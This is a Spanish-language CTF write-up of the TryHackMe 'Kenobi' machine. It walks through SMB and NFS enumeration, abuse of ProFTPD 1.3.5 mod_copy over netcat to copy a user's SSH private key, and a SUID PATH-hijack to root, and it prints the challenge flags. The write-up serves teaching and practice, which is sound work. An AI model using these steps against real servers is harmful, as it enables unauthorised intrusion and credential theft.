---
layout: post
title: Tryhackme - Kenobi
autor: S3cureroy
date: 2022-04-14
categories: [CTF, Tryhackme]
tags: [ suid , samba , nfs , proftp , mod_copy ]
---

Esta máquina dispone de varios pasos que permite conocer varios protocolos como SMB, SSH o montar unidades NFS en el sistema.

El acceso inicial se hace montando directorios del sistema mediante FTP para obtener una clave SSH.

Una vez se accede, la escalada de privilegios se hará mediante uno de los métodos más conocidos en Linux, como es la explotación de ejecutables con permisos SUID.

## Enumeración. ##

Se lanza un escaneo de puertos añadiendo los parámetros para conocer las versiones, y que se lancen los scripts nse más usados.

~~~console
Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-17 19:23 GMT
Nmap scan report for 10.10.6.212
Host is up (0.039s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      37929/tcp   mountd
|   100005  1,2,3      38832/udp   mountd
|   100005  1,2,3      51870/udp6  mountd
|   100005  1,2,3      59829/tcp6  mountd
|   100021  1,3,4      41103/tcp6  nlockmgr
|   100021  1,3,4      42137/tcp   nlockmgr
|   100021  1,3,4      43381/udp6  nlockmgr
|   100021  1,3,4      49969/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m02s, deviation: 2h53m12s, median: 1s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2021-03-17T14:24:00-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-17T19:24:00
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.65 seconds
~~~

Al ver que uno de los *shares* del protocolo Samba tiene habilitado el acceso invitado, se lanzan los scripts nse para enumerar dicho protocolo.

~~~console
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.6.21

Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-17 19:31 GMT
Nmap scan report for 10.10.6.212
Host is up (0.040s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.6.212\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.6.212\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.6.212\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 7.21 seconds
~~~

Se verifica el acceso anónimo al share **anonymous**, por tanto, usando el comando ```smbclient``` se accede al sistema de ficheros.

Se puede ver que existe un fichero llamado log, el cual se obtiene con get.

~~~console
smbclient //10.10.6.212/anonymous
Enter WORKGROUP\secureroy's password: 
Try "help" to get a list of possible commands.
smb: \> ls 
  .                                   D        0  Wed Sep  4 11:49:09 2019
  ..                                  D        0  Wed Sep  4 11:56:07 2019
  log.txt                             N    12237  Wed Sep  4 11:49:09 2019

		9204224 blocks of size 1024. 6877092 blocks available
~~~

~~~console
get log.txt 
getting file \log.txt of size 12237 as log.txt (48.8 KiloBytes/sec) (average 48.8 KiloBytes/sec)
~~~

Se puede ver que el contenido del fichero indica que un usuario llamado **kenobi** ha creado una pareja de claves de SSH.

~~~console
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|           ..    |
|        . o. .   |
|       ..=o +.   |
|      . So.o++o. |
|  o ...+oo.Bo*o  |
| o o ..o.o+.@oo  |
|  . . . E .O+= . |
|     . .   oBo.  |
+----[SHA256]-----+
~~~

En dicho puerto no se puede hacer más por el momento, por ello, se lanzan los scripts nse en el puerto de rpc (111) para que se listen los recursos nfs que tenga compartidos.

Se descubre que el directorio ```/var``` se encuentra compartido y que adema

~~~console
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.6.212
Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-17 19:54 GMT
Nmap scan report for 10.10.6.212
Host is up (0.19s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
~~~

Entonces, se debe montar en la máquina local dicha partición remota.

Para ello, se debe usar el comando ```mount```, aunque se debe disponer del paquete ```nfs-common``` para montar unidades remotas mediante el protocolo NFS.

![](https://i.imgur.com/2FjTJlE.png)

## Acceso inicial. ## 

Se buscan algún exploit del programa proftp en su versión 1.3.5 y se encuentra una del módulo **mod_copy**.

La vulnerabilidad hace uso de los comandos ```cpfr``` y ```cpto``` para copiar la ruta elegida donde se defina en el destino.

Entonces, se mediante el comando ```netcat``` se accede al puerto 21, el cual permite el acceso anónimo, y así poder lanzar los comandos para montar el directorio personal del usuario **kenobi** en la ruta ```/var``` y así poder acceder mediante el montaje hecho previamente.

~~~console
nc 10.10.65.29 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.65.29]
site help
214-The following SITE commands are recognized (* =>'s unimplemented)
 CPFR <sp> pathname
 CPTO <sp> pathname
 HELP
 CHGRP
 CHMOD
214 Direct comments to root@kenobi
site cpfr /home/kenobi 
350 File or directory exists, ready for destination name
site cpto /var/tmp/
250 Copy successf


Nmap done: 1 IP address (1 host up) scanned in 0.80 seconds
~~~

~~~console
site cpfr /home/kenobi
350 File or directory exists, ready for destination name
site cpto /var/tmp
250 Copy successful
~~~

Accediendo entonces al directorio montado, se puede obtener la clave privada SSH para acceder mediante dicho protocolo a la máquina.

![](https://i.imgur.com/E6JWX3S.png)

Se consigue la flag del usuario (**d0b0f3f53b6caa532a83915e19224899**)


## Escalada de privilegios. ## 

Una vez dentro de la máquina, se debe enumerar una posible escalada de privilegios, empezando por la bñusqueda de ficheros ejecutables con permisos SUID.

~~~console
find / -perm -u=s -type f 2>/dev/null
~~~  

Se encuentran varios, pero entre ellos, uno que no suele darse habitualmente, el que tiene la ruta ```/var/bin/menu```.

![](https://i.imgur.com/xHQEB1C.png)

Se buscan cadenas de texto en el fichero, mediante el comando ```strings``` , viendo que se lanza el comando ```ifconfig``` sin indicar la ruta completa, lo que hace que se pueda explotar mediante la variable $PATH.

![](https://i.imgur.com/inGLB1J.png)

Por tanto, desde el directorio actual (con permisos de escritura, por eso en este caso se hace en ```/tmp```) se crea un fichero llamado **ifconfig** que contiene la llamada a una shell.

~~~console
echo /bin/bash > ifconfig
~~~

Se le dan permisos de ejecución.

~~~console
chmod u+x ifconfig
~~~

Por último, se añade la ruta actual en la variable $PATH, en primer lugar, puesto que cuando se ejecuta un comando, éste, verifica la variable y busca el nombre del ejecutable en las rutas definidas, en el orden indicado.

~~~console
PATH=/tmp:$PATH
~~~

Quedando así.

~~~console
echo $PATH
/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
~~~

Se ejecuta el fichero ejecutable, indicando la opción que ejecute el comendo necesario, obteniendo una shell con el usuario root.

![](https://i.imgur.com/2ag4EkK.png)

Para terminar, se obtiene la flag del usuario root, vulnerando la máquina completamente.

~~~console
cat root.txt
177b3cd8562289f37382721c28381f02
~~~
